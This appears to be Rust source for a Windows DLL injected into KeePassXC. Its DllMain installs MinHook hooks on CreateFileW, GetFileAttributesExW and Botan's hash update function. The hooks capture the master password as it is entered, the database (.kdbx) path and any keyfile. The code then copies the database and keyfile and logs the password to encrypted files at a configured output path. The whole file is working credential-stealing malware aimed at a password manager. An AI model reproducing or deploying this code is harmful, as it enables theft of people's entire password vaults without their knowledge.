use crypto_common::encrypt_and_log_data_to_file;
use minhook_sys::{MH_CreateHook, MH_EnableHook, MH_Initialize, MH_Uninitialize, MH_OK};
use std::{
    env::current_exe,
    ffi::c_void,
    fs::{self},
    mem::transmute,
    ptr::null_mut,
    slice,
    sync::Mutex,
    time::{SystemTime, UNIX_EPOCH},
};
use windows::{
    core::{PCSTR, PCWSTR},
    Win32::{
        Foundation::{BOOL, HINSTANCE},
        System::{
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH},
        },
    },
};

use windows_sys::Win32::{
    Foundation::HANDLE,
    Security::SECURITY_ATTRIBUTES,
    Storage::FileSystem::{
        GetFileAttributesExW, FILE_CREATION_DISPOSITION, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_MODE,
    },
};

use std::{process, sync::Once};

#[cfg(debug_assertions)]
use crypto_common::log_data;

static START: Once = Once::new();

const PUBLIC_KEY: &[u8; 32] = include_bytes!("../../public.key");
const OUTPUT_PATH: &str = env!("OUTPUT_PATH");

static LAST_IS_VALID_UTF: Mutex<bool> = Mutex::new(false);
static LAST_KDBX: Mutex<String> = Mutex::new(String::new());
static LAST_KEYFILE: Mutex<String> = Mutex::new(String::new());

static mut ORIGINAL_CREATE_FILE_W: *mut c_void = null_mut();
static mut ORIGINAL_UPDATE_HASH: *mut c_void = null_mut();
static mut ORIGINAL_GET_FILE_ATTRIBUTES_EX_W: *mut c_void = null_mut();

extern "C" fn create_file_w_hook(
    lpfilename: PCWSTR,
    dwdesiredaccess: u32,
    dwsharemode: FILE_SHARE_MODE,
    lpsecurityattributes: *const SECURITY_ATTRIBUTES,
    dwcreationdisposition: FILE_CREATION_DISPOSITION,
    dwflagsandattributes: FILE_FLAGS_AND_ATTRIBUTES,
    htemplatefile: HANDLE,
) -> HANDLE {
    type FnCreateFileW = extern "C" fn(
        PCWSTR,
        u32,
        FILE_SHARE_MODE,
        *const SECURITY_ATTRIBUTES,
        FILE_CREATION_DISPOSITION,
        FILE_FLAGS_AND_ATTRIBUTES,
        HANDLE,
    ) -> HANDLE;

    let original_func: FnCreateFileW = unsafe { transmute(ORIGINAL_CREATE_FILE_W) };

    // Use try_lock to ensure no deadlock occur when copying the keyfile when a password is entered
    if let Ok(mut keyfile_mutex) = LAST_KEYFILE.try_lock() {
        if let Ok(file_path) = unsafe { lpfilename.to_string() } {
            if file_path.ends_with(".key") || file_path.ends_with(".keyx") {
                *keyfile_mutex = file_path.clone();
            }
        }
    }

    original_func(
        lpfilename,
        dwdesiredaccess,
        dwsharemode,
        lpsecurityattributes,
        dwcreationdisposition,
        dwflagsandattributes,
        htemplatefile,
    )
}

extern "C" fn get_file_attributes_ex_w_hook(
    filename: PCWSTR,
    f_info_level_id: *mut c_void,
    lp_file_information: *mut c_void,
) -> BOOL {
    if let Ok(file_name) = unsafe { filename.to_string() } {
        if file_name.ends_with(".kdbx") {
            let mut mutex_last_kdbx = LAST_KDBX.lock().unwrap();
            *mutex_last_kdbx = file_name.clone();
        }
    }

    type FnGetFileAttributesExW = extern "C" fn(PCWSTR, *mut c_void, *mut c_void) -> BOOL;
    let original_func: FnGetFileAttributesExW =
        unsafe { transmute(ORIGINAL_GET_FILE_ATTRIBUTES_EX_W) };

    original_func(filename, f_info_level_id, lp_file_information)
}

extern "C" fn update_hash_hook(
    this: *mut c_void,
    hash_data: *const u8,
    hash_data_len: usize,
) -> usize {
    let password_data = unsafe { slice::from_raw_parts(hash_data, hash_data_len) };

    // Check that password data contains something other than \x00 and \x01, which can be valid utf8, but not a valid password
    let password_contains_data = password_data.iter().all(|item| *item >= 0x20);

    let mut mutext_last_is_valid_utf8 = LAST_IS_VALID_UTF.lock().unwrap();
    let mut mutex_last_kdbx = LAST_KDBX.lock().unwrap();
    let mut mutex_last_keyfile = LAST_KEYFILE.lock().unwrap();

    let keyfile_path = &*mutex_last_keyfile;
    let kdbx_path = &*mutex_last_kdbx;

    if let Ok(password_string) = String::from_utf8(password_data.to_vec()) {
        if !password_string.is_empty()
            // Blacklist this string that is used during tests before actual loading
            && !password_string.eq("abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq")
            && password_contains_data
        {
            let password_line: Vec<u16> = format!(
                "[KeePassXC] Password({}) : {:?}",
                hash_data_len, password_string
            )
            .encode_utf16()
            .collect();

            let kdbx_line = {
                if let Ok(kdbx_data) = fs::read(kdbx_path.clone()) {
                    let mut output_file_name = OUTPUT_PATH.to_string();

                    output_file_name.push_str(&format!(
                        "kdbx.{}.",
                        SystemTime::now()
                            .duration_since(UNIX_EPOCH)
                            .unwrap()
                            .as_secs()
                    ));

                    match encrypt_and_log_data_to_file(
                        output_file_name.clone(),
                        &kdbx_data,
                        PUBLIC_KEY,
                    ) {
                        Ok(_) => {
                            format!(
                                "[KeePassCX] KDBX : {} -> {}{}.log",
                                kdbx_path,
                                output_file_name,
                                process::id()
                            )
                        }
                        Err(_) => {
                            format!("[KeePassCX] KDBX : {} -> Failed writing KDBX", kdbx_path)
                        }
                    }
                } else {
                    format!("[KeePassCX] KDBX : {} -> Error reading KDBX", kdbx_path)
                }
            };

            let line: Vec<u16> = kdbx_line.encode_utf16().collect();

            #[cfg(not(debug_assertions))]
            let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, &PUBLIC_KEY);
            #[cfg(debug_assertions)]
            let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, &PUBLIC_KEY);

            #[cfg(debug_assertions)]
            {
                if result.is_err() {
                    log_data(format!(
                        "PID {} - Failed writing output log file",
                        process::id()
                    ));
                }
            }

            *mutex_last_kdbx = String::new();
            *mutex_last_keyfile = String::new();
            *mutext_last_is_valid_utf8 = true;

            #[cfg(not(debug_assertions))]
            let _ =
                encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &password_line, PUBLIC_KEY);
            #[cfg(debug_assertions)]
            let result =
                encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &password_line, PUBLIC_KEY);

            #[cfg(debug_assertions)]
            {
                if result.is_err() {
                    log_data(format!(
                        "PID {} - Failed writing output log file",
                        process::id()
                    ));
                }
            }
        }
    } else {
        // Not valid UTF8, was the last time a valid one ?
        // If so, we check if a keyfile was read.

        if *mutext_last_is_valid_utf8 == true {
            // Check if we have a keyfile that was open
            let keyfile_line = {
                if keyfile_path.is_empty() {
                    // No key file
                    format!("[KeePassXC] Keyfile : no key file")
                } else {
                    // We have a keyfile, let's copy it to our output directory

                    if let Ok(keyfile_data) = fs::read(keyfile_path.clone()) {
                        let mut output_file_name = OUTPUT_PATH.to_string();

                        output_file_name.push_str(&format!(
                            "keyfile.{}.",
                            SystemTime::now()
                                .duration_since(UNIX_EPOCH)
                                .unwrap()
                                .as_secs()
                        ));

                        match encrypt_and_log_data_to_file(
                            output_file_name.clone(),
                            &keyfile_data,
                            PUBLIC_KEY,
                        ) {
                            Ok(_) => {
                                format!(
                                    "[KeePassCX] Keyfile : {} -> {}{}.log",
                                    keyfile_path,
                                    output_file_name,
                                    process::id()
                                )
                            }
                            Err(_) => {
                                format!(
                                    "[KeePassCX] Keyfile : {} -> Failed writing keyfile",
                                    keyfile_path
                                )
                            }
                        }
                    } else {
                        format!(
                            "[KeePassCX] Keyfile : {} -> Error reading KeyFile",
                            keyfile_path
                        )
                    }
                }
            };

            let line: Vec<u16> = keyfile_line.encode_utf16().collect();

            #[cfg(not(debug_assertions))]
            let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, &PUBLIC_KEY);
            #[cfg(debug_assertions)]
            let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, &PUBLIC_KEY);

            #[cfg(debug_assertions)]
            {
                if result.is_err() {
                    log_data(format!(
                        "PID {} - Failed writing output log file",
                        process::id()
                    ));
                }
            }
        } else {
            /*
            #[cfg(debug_assertions)]
            {
                let line = format!("[KeePassXC] Probable junk data {:?}", password_data);
                log_data(line);
            }
            */
        }

        *mutext_last_is_valid_utf8 = false;
    }

    type FnUpdateHash =
        extern "C" fn(this: *mut c_void, hash_data: *const u8, hash_data_len: usize) -> usize;

    let original_func: FnUpdateHash = unsafe { transmute(ORIGINAL_UPDATE_HASH) };

    let ret_val = original_func(this, hash_data, hash_data_len);

    ret_val
}

fn hook_botan() {
    if unsafe { MH_Initialize() } != MH_OK {
        #[cfg(debug_assertions)]
        {
            log_data(format!("PID : {} - Failed MH_Initialize\n", process::id()));
        }
        return;
    }

    if unsafe {
        MH_CreateHook(
            GetFileAttributesExW as *mut c_void,
            get_file_attributes_ex_w_hook as *mut c_void,
            &mut ORIGINAL_GET_FILE_ATTRIBUTES_EX_W,
        )
    } != MH_OK
    {
        #[cfg(debug_assertions)]
        {
            log_data(format!(
                "PID : {} - Failed MH_CreateHook for GetFileAttributesExW\n",
                process::id()
            ));
        }
        return;
    }

    if unsafe { MH_EnableHook(GetFileAttributesExW as *mut c_void) } != MH_OK {
        #[cfg(debug_assertions)]
        {
            log_data(format!(
                "PID : {} - Failed MH_EnableHook for GetFileAttributesExW\n",
                process::id()
            ));
        }
        return;
    }

    //

    let kernelbase_handle = unsafe { GetModuleHandleA(PCSTR("kernelbase.dll\0".as_ptr())) };
    if kernelbase_handle.is_ok() {
        let kernelbase_handle = kernelbase_handle.unwrap();

        let func = unsafe { GetProcAddress(kernelbase_handle, PCSTR("CreateFileW\0".as_ptr())) };

        if func.is_some() {
            let func_addr = func.unwrap();
            if unsafe {
                MH_CreateHook(
                    func_addr as *mut c_void,
                    create_file_w_hook as *mut c_void,
                    &mut ORIGINAL_CREATE_FILE_W,
                )
            } != MH_OK
            {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_CreateHook for CreateFileW\n",
                        process::id()
                    ));
                }
                return;
            }

            if unsafe { MH_EnableHook(func_addr as *mut c_void) } != MH_OK {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_EnableHook for CreateFileW\n",
                        process::id()
                    ));
                }
                return;
            }

            let func = unsafe {
                GetProcAddress(kernelbase_handle, PCSTR("GetFileAttributesExW\0".as_ptr()))
            };

            if func.is_some() {
                let func_addr = func.unwrap();
                if unsafe {
                    MH_CreateHook(
                        func_addr as *mut c_void,
                        get_file_attributes_ex_w_hook as *mut c_void,
                        &mut ORIGINAL_GET_FILE_ATTRIBUTES_EX_W,
                    )
                } != MH_OK
                {
                    #[cfg(debug_assertions)]
                    {
                        log_data(format!(
                            "PID : {} - Failed MH_CreateHook for GetFileAttributesExW\n",
                            process::id()
                        ));
                    }
                    return;
                }

                if unsafe { MH_EnableHook(func_addr as *mut c_void) } != MH_OK {
                    #[cfg(debug_assertions)]
                    {
                        log_data(format!(
                            "PID : {} - Failed MH_EnableHook for GetFileAttributesExW\n",
                            process::id()
                        ));
                    }
                    return;
                }
            } else {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID {} - Failed GetModuleHandleA for kernelbase.dll",
                        process::id()
                    ));
                }
            }
        }
    }

    let mut botan_handle = unsafe { GetModuleHandleA(PCSTR("botan.dll\0".as_ptr())) };

    if botan_handle.is_err() {
        botan_handle = unsafe { GetModuleHandleA(PCSTR("botan-3.dll\0".as_ptr())) };
    }


    if botan_handle.is_ok() {
        let botan_handle = botan_handle.unwrap();

        // Mangled name for public: void __cdecl Botan::Buffered_Computation::update(unsigned char const * __ptr64 const,unsigned __int64) __ptr64

        let func = unsafe {
            GetProcAddress(
                botan_handle,
                PCSTR("?update@Buffered_Computation@Botan@@QEAAXQEBE_K@Z\0".as_ptr()),
            )
        };

        if func.is_some() {
            let func_addr = func.unwrap();
            if unsafe {
                MH_CreateHook(
                    func_addr as *mut c_void,
                    update_hash_hook as *mut c_void,
                    &mut ORIGINAL_UPDATE_HASH,
                )
            } != MH_OK
            {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_CreateHook for Botan::Buffered_Computation::update\n",
                        process::id()
                    ));
                }
                return;
            }

            if unsafe { MH_EnableHook(func_addr as *mut c_void) } != MH_OK {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_EnableHook for Botan::Buffered_Computation::update\n",
                        process::id()
                    ));
                }
                return;
            }
        } else {
            #[cfg(debug_assertions)]
            {
                log_data(format!(
                    "PID {} - Failed GetModuleHandleA for botan.dll",
                    process::id()
                ));
            }
        }
    }
}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(dll_module: HINSTANCE, call_reason: u32, _: *mut ()) -> bool {
    match call_reason {
        DLL_PROCESS_ATTACH => START.call_once(|| {
            if let Ok(exe_name) = current_exe() {
                if exe_name.ends_with("KeePassXC.exe") {
                    hook_botan();
                }
            }
        }),
        DLL_PROCESS_DETACH => unsafe {
            if MH_Uninitialize() != MH_OK {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID {} - Failed to uninitialize MinHook",
                        process::id()
                    ));
                }

                return false;
            }
        },
        _ => {}
    }

    true
}
